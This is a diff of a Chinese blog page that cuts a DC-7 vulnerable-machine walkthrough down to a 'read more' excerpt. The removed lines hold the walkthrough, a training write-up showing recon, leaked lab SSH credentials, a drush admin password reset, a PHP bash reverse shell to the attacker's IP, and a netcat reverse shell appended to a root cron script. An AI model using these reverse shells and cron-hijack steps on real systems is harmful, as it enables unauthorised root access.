@@ -188,7 +188,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-15 16:03:29" itemprop="dateModified" datetime="2025-06-15T16:03:29+08:00">2025-06-15</time>
+                <time title="修改时间：2025-06-15 16:05:27" itemprop="dateModified" datetime="2025-06-15T16:05:27+08:00">2025-06-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -211,106 +211,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>本次学习的是DC-7靶机，涉及到信息收集，反弹shell和定时任务提权</p>
-<!--more--->
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看靶机ip地址：</p>
-<p><img src="1.png" alt="图片"></p>
-<p><strong>192.168.130.147</strong></p>
-<p>nmap查找开放端口：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.130.147</span><br></pre></td></tr></table></figure>
-<p><img src="2.png" alt="图片"></p>
-<p>开放了80:http端口和22:ftp端口</p>
-<p>再用dirsearch扫描web的目录结构，指定200和403</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.130.147 -i 200,403</span><br></pre></td></tr></table></figure>
-<p><img src="3.png" alt="图片"></p>
-<p>扫描到<strong>/user/login/</strong>目录</p>
-<p>不过在主页有个提示：暴力破解是不行的</p>
-<p><img src="4.png" alt="图片"></p>
-<p>来到登录页面，发现左下角有该cms的标识：Drupal</p>
-<p><img src="5.png" alt="图片"></p>
-<p>我们可以用msf查找历史漏洞，但是使用了所有历史漏洞都没能拿到shell</p>
-<p><img src="6.png" alt="图片"></p>
-<p>我们还注意到左下角有一个信息：@DC7USER</p>
-<p><img src="7.png" alt="图片"></p>
-<p>使用浏览器查找，发现是来自一个github的项目:</p>
-<p><img src="8.png" alt="图片"></p>
-<p>在里面的配置文件找到user和passwd信息</p>
-<p><img src="9.png" alt="图片"></p>
-<p><img src="10.png" alt="图片"></p>
-<p>但是在web登录页面登不进去，尝试ssh登录成功</p>
-<p><img src="11.png" alt="图片"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh dc7user@192.168.130.147</span><br><span class="line">MdR3xOgB7#dW</span><br></pre></td></tr></table></figure>
-<p><img src="12.png" alt="图片"></p>
-<h2 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h2><p>尝试suid提权：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="13.png" alt="图片"></p>
-<p>感觉没有可以用的命令，看下sudo能用的命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
-<p><img src="14.png" alt="图片"></p>
-<p>也没法用sudo，但提示我们有邮箱信息，查看内容：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/mail/dc7user</span><br></pre></td></tr></table></figure>
-<p><img src="15.png" alt="图片"></p>
-<ul>
-<li><strong><code>Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</code></strong><ul>
-<li>主题明确标注这是由 <strong>Cron 守护进程</strong> 触发的任务，执行的脚本是 <code>/opt/scripts/backups.sh</code>。</li>
-</ul>
-</li>
-<li><strong><code>From: root@dc-7 (Cron Daemon)</code></strong><ul>
-<li>发件人显示为 <code>Cron Daemon</code>，这是 Cron 任务执行后发送通知邮件的标准标识。</li>
-</ul>
-</li>
-</ul>
-<p>因为每个一段时间就会执行该sh脚本，并且是以root身份执行的，如果我们可以向这个sh脚本中写一个反弹shell的命令，那我们岂不是可以拿到shell？那就这么办（这里如果写入一个打开新shell的命令，是无法拿到root的shell的，这里我是与dc-6中的sh的思路进行比较）</p>
-<p>我们看一下修改该文件所需要的用户和用户组：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
-<p><img src="17.png" alt="图片"></p>
-<p>要么是root用户，要么是www-data组，root肯定拿不到，那就需要才www-data出发，该用户一般是web服务的，那我们就需要拿到web所属用户的shell，那我们就需要一个登录用户名和密码，这该如何获取呢？</p>
-<p>这里验证一下www-data用户的进程信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -fu www-data</span><br></pre></td></tr></table></figure>
-<p><img src="18.png" alt="图片"></p>
-<p>可以确定www-data就是web服务的用户</p>
-<p>我们看下sh脚本内容有什么：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
-<p><img src="16.png" alt="图片"></p>
-<p>这里看起来没有可以弹shell的命令，那就只能找关于web用户的了，这里注意到有一个drush命令，问一波ai这是什么：</p>
-<p><strong>Drush</strong>（<strong>D</strong>rupal <strong>Sh</strong>ell）是 <strong>Drupal 的官方命令行工具</strong>，专门为 Drupal 系统设计，用于通过终端（命令行)高效管理 Drupal 网站。。。<strong>那就是我们可以用drush创建用户了</strong>，那这一切就如鱼得水了</p>
-<p><strong>Drush 必须在 Drupal 根目录（或通过 <code>--root</code> 指定）才能执行依赖数据库的命令</strong>：切换目录，同时新建用户名和密码：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">drush user-password admin --password=admin</span><br></pre></td></tr></table></figure>
-<p><img src="20.png" alt="图片"></p>
-<p><img src="21.png" alt="图片"></p>
-<p>成功用新建的用户登录</p>
-<p>在后台我们发现可以新建一个被全局引用的page页面，如果我们向里面加入一个反弹shell的语句，那么就可以拿到www-data用户的webshell了</p>
-<p>因为这里不能编写php的页面，所以需要先下载插件：</p>
-<p><img src="22.png" alt="图片"></p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</span><br></pre></td></tr></table></figure>
-<p><img src="23.png" alt="图片"></p>
-<p>下载完后，需要开启php的拓展才可以：</p>
-<p><img src="24.png" alt="图片"></p>
-<p>然后先开启监听，然后写入命令，生成一个php文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里的ip是kali的</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.130.128/8888 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="27.png" alt="图片"></p>
-<p><img src="28.png" alt="图片"></p>
-<div class="note info">
-            <p>如果不能反弹成功，可能是因为这个原因：</p><p>点击这里红色标注，如果结果成功，那么应该就可以反弹shell了</p><p><img src="26.png" alt="图片"></p>
-          </div>
-<div class="note info">
-            <p>还有一种获取webshell的方法：写入一句话木马，然后连接蚁剑，再反弹shell</p><p><img src="29.png" alt="图片"></p><p><img src="30.png" alt="图片"></p><p><img src="31.png" alt="图片"></p>
-          </div>
-<p>查看当前webshell用户的组：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">groups</span></span><br></pre></td></tr></table></figure>
-<p><img src="32.png" alt="图片"></p>
-<p>我们有这个权限，我们可以向sh脚本中加入反弹shell的语句</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里的ip是kali的</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;nc -e /bin/bash 192.168.130.128 7777&#x27;</span> &gt;&gt; /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
-<p><img src="33.png" alt="图片"></p>
-<p>成功拿到flag，寻找最终的flag</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br><span class="line"><span class="built_in">cat</span> /root/theflag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="34.png" alt="图片"></p>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51577576/article/details/143277367">https://blog.csdn.net/qq_51577576/article/details/143277367</a></p>
-<ul>
-<li><strong>人生若只如初见，何事秋风悲画扇</strong></li>
-</ul>
-
+          <p> 本次学习的是DC-7靶机，涉及到信息收集，反弹shell和定时任务提权</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/06/14/DC-7%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
